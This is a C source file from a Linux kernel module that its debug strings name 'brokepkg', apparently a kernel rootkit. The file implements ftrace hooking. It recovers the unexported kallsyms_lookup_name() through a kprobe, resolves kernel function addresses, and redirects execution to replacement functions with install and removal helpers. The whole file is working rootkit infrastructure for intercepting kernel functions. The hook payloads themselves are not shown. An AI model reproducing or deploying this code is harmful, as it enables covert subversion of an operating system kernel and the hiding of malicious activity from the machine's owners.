#include "hooks.h"

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported,
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>
static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs
static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs) {
  return fregs;
}
#endif

int fh_resolve_hook_address(struct ftrace_hook *hook) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
#endif
  hook->address = kallsyms_lookup_name(hook->name);

  if (!hook->address) {
#ifdef DEBUG
    printk(KERN_DEBUG "brokepkg: unresolved symbol: %s\n", hook->name);
#endif
    return -ENOENT;
  }

#if USE_FENTRY_OFFSET
  *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
  *((unsigned long *)hook->original) = hook->address;
#endif

  return 0;
}

void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops, struct ftrace_regs *fregs) {
  struct pt_regs *regs = ftrace_get_regs(fregs);
  struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
  regs->ip = (unsigned long)hook->function;
#else
  if (!within_module(parent_ip, THIS_MODULE))
    regs->ip = (unsigned long)hook->function;
#endif
}

int fh_install_hook(struct ftrace_hook *hook) {
  int err;
  err = fh_resolve_hook_address(hook);
  if (err) return err;

  hook->ops.func = fh_ftrace_thunk;
  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                    FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
  if (err) {
#ifdef DEBUG
    printk(KERN_DEBUG "brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
#endif
    return err;
  }

  err = register_ftrace_function(&hook->ops);
  if (err) {
#ifdef DEBUG
    printk(KERN_DEBUG "brokepkg: register_ftrace_function() failed: %d\n", err);
#endif
    return err;
  }

  return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
  int err;
  err = unregister_ftrace_function(&hook->ops);
#ifdef DEBUG
  if (err) {
    printk(KERN_DEBUG "brokepkg: unregister_ftrace_function() failed: %d\n",
           err);
  }
#endif

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
  if (err) {
#ifdef DEBUG
    printk(KERN_DEBUG "brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
#endif
  }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
  int err;
  size_t i;

  for (i = 0; i < count; i++) {
    err = fh_install_hook(&hooks[i]);
    if (err) goto error;
  }
  return 0;

error:
  while (i != 0) {
    fh_remove_hook(&hooks[--i]);
  }
  return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
  size_t i;

  for (i = 0; i < count; i++) fh_remove_hook(&hooks[i]);
}
